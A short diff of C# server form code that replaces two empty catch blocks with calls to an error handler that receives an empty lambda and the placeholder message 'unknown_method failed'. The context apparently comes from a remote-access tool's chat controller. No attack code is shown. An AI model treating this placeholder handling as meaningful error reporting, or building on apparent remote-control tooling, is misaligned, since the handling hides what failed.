@@ -53,7 +53,10 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Pac_ket").AsString = "chatExit";
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
-                catch { }
+                catch (Exception ex)
+            {
+                ErrorHandler.HandleNonCritical(() => { }, ex, "unknown_method failed");
+            }
             }
         }
 
@@ -63,7 +66,10 @@ namespace Server.Forms
             {
                 if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
             }
-            catch { }
+            catch (Exception ex)
+            {
+                ErrorHandler.HandleNonCritical(() => { }, ex, "unknown_method failed");
+            }
         }
 
         private void button1_Click(object sender, EventArgs e)
